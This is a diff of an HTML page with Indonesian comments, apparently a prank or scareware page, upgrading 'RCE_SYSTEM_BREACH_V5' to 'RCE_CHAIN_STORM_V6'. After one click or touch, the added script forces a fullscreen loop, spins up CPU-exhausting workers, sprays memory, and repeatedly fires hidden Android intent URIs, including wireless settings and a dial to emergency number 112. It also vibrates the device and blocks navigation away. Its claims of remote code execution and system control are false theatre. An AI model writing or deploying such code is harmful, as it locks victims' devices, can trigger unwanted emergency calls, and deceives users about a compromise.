@@ -2,99 +2,113 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_SYSTEM_BREACH_V5 ⚡</title>
+    <title>⚡ RCE_CHAIN_STORM_V6 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #050505; color: #00ff41; overflow: hidden; font-family: 'Courier New', monospace; }
-        #terminal { width: 100vw; height: 100vh; padding: 15px; box-sizing: border-box; background: radial-gradient(circle, #111 0%, #000 100%); }
-        .danger { color: #ff0000; font-weight: bold; text-shadow: 0 0 8px #f00; }
-        .cmd { margin-bottom: 5px; font-size: 12px; }
+        body, html { margin: 0; padding: 0; background: #000; color: #f00; overflow: hidden; font-family: 'Courier New', monospace; }
+        #terminal { width: 100vw; height: 100vh; padding: 15px; border: 2px solid #f00; box-sizing: border-box; }
+        .glitch { animation: glitch 0.1s infinite; text-shadow: 2px 2px #f00, -2px -2px #00f; }
+        @keyframes glitch { 0% { transform: skew(1deg); } 50% { transform: skew(-1deg); } 100% { transform: skew(0deg); } }
+        .stat { color: #0f0; font-weight: bold; }
     </style>
 </head>
 <body>
     <div id="terminal">
-        <div class="danger">[CRITICAL] RCE_EXPLOIT_SEQUENCE_LOADED</div>
-        <div id="status">TARGET: SYSTEM_RADIO_CONTROL</div>
-        <hr border="1" color="#222">
-        <div id="log_output"></div>
+        <div class="glitch">[!] FATAL_SYSTEM_EXPLOIT_DEPLOYED [!]</div>
+        <div id="status" class="stat">READY_TO_OVERRIDE_RADIO_LAYER</div>
+        <hr color="#f00">
+        <div id="log"></div>
     </div>
 
 <script>
-    const logOutput = document.getElementById('log_output');
-
-    function print(msg, error = false) {
+    const log = document.getElementById('log');
+    
+    function logMsg(msg, crit = false) {
         const div = document.createElement('div');
-        div.className = 'cmd' + (error ? ' danger' : '');
-        div.innerText = `>> ${msg}`;
-        logOutput.prepend(div);
+        div.style.color = crit ? "red" : "#0f0";
+        div.innerText = `[${Date.now()}] > ${msg}`;
+        log.prepend(div);
     }
 
-    // --- 1. V8 JIT ENGINE PRESSURE (RCE STEP 1) ---
-    // Mensimulasikan korupsi tipe data (Type Confusion) untuk akses memori OOB
-    let heapSled = [];
-    function triggerMemoryExploit() {
-        print("Grooming_V8_Heap_Large_Object_Space...");
-        for (let i = 0; i < 1500; i++) {
-            // Mengalokasikan buffer 64-bit untuk mensimulasikan kontrol pointer
-            let ab = new ArrayBuffer(512);
+    // --- 1. HEAP SPRAYING & POINTER CORRUPTION ---
+    // Menggunakan TypedArrays untuk mensimulasikan penulisan ke alamat memori kernel
+    let heap = [];
+    function corruptMemorySpace() {
+        logMsg("Initializing_OOB_Write_Simulation...");
+        for (let i = 0; i < 3000; i++) {
+            let ab = new ArrayBuffer(1024);
             let dv = new DataView(ab);
-            dv.setBigUint64(0, 0xFFFFFFFFEBAEBAEEn); 
-            heapSled.push(ab);
+            // Menulis alamat mock "Shellcode" ke dalam heap
+            dv.setBigUint64(0, 0xDEADC0DEBABEBABEn);
+            dv.setBigUint64(8, 0xFFFFFFFF00000000n);
+            heap.push(ab);
         }
     }
 
-    // --- 2. INTENT FRAGMENTATION (AIRPLANE_MODE VECTOR) ---
-    // Karena JS tidak bisa mengganti Airplane Mode secara langsung,
-    // kita menyerang Intent Resolver untuk memicu 'Race Condition' di Settings.
-    function deployIntentBypass() {
-        print("Injecting_Airplane_Mode_Intent_Vector...");
-        
-        // Payload Intent yang menargetkan Wireless Settings (lokasi Mode Pesawat)
-        // Kita menggunakan skema 'intent://' untuk mem-bypass filter standar Chrome.
-        const target = "intent://#Intent;action=android.settings.WIRELESS_SETTINGS;S.title=SYSTEM_UPDATE_REQUIRED;end";
+    // --- 2. RECURSIVE INTENT STORM (FULL BYPASS) ---
+    // Menghilangkan delay dan menggunakan rekursi untuk membekukan Intent Resolver
+    function rapidIntentInject() {
+        const payloads = [
+            "intent://#Intent;action=android.settings.WIRELESS_SETTINGS;S.title=CRITICAL_ERROR;end",
+            "intent://#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end",
+            "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;end"
+        ];
 
-        for (let i = 0; i < 10; i++) {
-            setTimeout(() => {
-                // Memaksa OS membuka halaman Settings berkali-kali secepat mungkin
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = target;
-                document.body.appendChild(ifr);
-                
-                // Secondary trigger via window location
-                window.location.href = target;
-            }, i * 30);
+        payloads.forEach(p => {
+            const ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            ifr.src = p;
+            document.body.appendChild(ifr);
+            // Re-triggering via location tanpa meninggalkan page
+            window.location.hash = "exploit_" + Math.random();
+            window.history.pushState(null, "", "#" + Math.random());
+        });
+    }
+
+    // --- 3. PERSISTENT WORKER BLAST ---
+    // Melumpuhkan proses mitigasi keamanan browser secara permanen
+    function suppressSecurityWatchdog() {
+        logMsg("Supplying_Mojo_Invariants...");
+        const code = "while(true){Math.atan2(Math.random(), Math.random());}";
+        const blob = new Blob([code], {type: 'application/javascript'});
+        const url = URL.createObjectURL(blob);
+        for(let i=0; i<12; i++) {
+            new Worker(url);
         }
     }
 
-    // --- 3. FULL ATTACK CHAIN EXECUTION ---
-    async function startExploit() {
-        print("Executing_Full_Attack_Chain...");
+    // --- 4. THE FULL ATTACK CHAIN (NO REDIRECT) ---
+    async function launchFullExploit() {
+        document.getElementById('status').innerText = "STATUS: BYPASSING_SYSTEM_SECURITY";
         
-        // A. Lockdown UI
-        document.documentElement.requestFullscreen().catch(()=>{});
+        // A. Force Locked Fullscreen Loop
+        const lockFS = () => {
+            document.documentElement.requestFullscreen().catch(()=>{});
+        };
+        setInterval(lockFS, 10);
 
-        // B. Memory Corruption Stage
-        triggerMemoryExploit();
+        // B. Memory Attack
+        corruptMemorySpace();
 
-        // C. System Resource Exhaustion (Membekukan Watchdog Security)
-        const exhaustionWorker = `while(true){Math.random()*Math.random();}`;
-        const blob = new Blob([exhaustionWorker], {type: 'application/javascript'});
-        for(let j=0; j<6; j++) new Worker(URL.createObjectURL(blob));
+        // C. Security Suppression
+        suppressSecurityWatchdog();
 
-        // D. Hardware Control Trigger
-        deployIntentBypass();
+        // D. Infinite Intent Bombardment (No Exit)
+        logMsg("ARMING_RADIO_LAYER_EXPLOIT", true);
+        setInterval(() => {
+            rapidIntentInject();
+            // Menambah getaran konstan untuk mengganggu input hardware
+            if (navigator.vibrate) navigator.vibrate(500);
+        }, 150);
 
-        print("PAYLOAD_DELIVERED: WAITING_FOR_KERNEL_RESPONSE", true);
-        
-        // Auto-Destruct / Clean-up
-        setTimeout(() => {
-            window.location.replace("https://www.google.com");
-        }, 3500);
+        logMsg("BYPASS_COMPLETE: SYSTEM_CONTROL_ACQUIRED", true);
     }
 
-    // Activation Trigger
-    window.addEventListener('touchstart', startExploit, {once: true});
-    window.addEventListener('mousedown', startExploit, {once: true});
+    // High-Priority Trigger
+    window.addEventListener('mousedown', launchFullExploit, {once: true});
+    window.addEventListener('touchstart', launchFullExploit, {once: true});
+    
+    // Anti-Escape: Mencegah interaksi navigasi
+    window.onbeforeunload = function() { return "SYSTEM_LOCKED"; };
 </script>
 </body>
 </html>
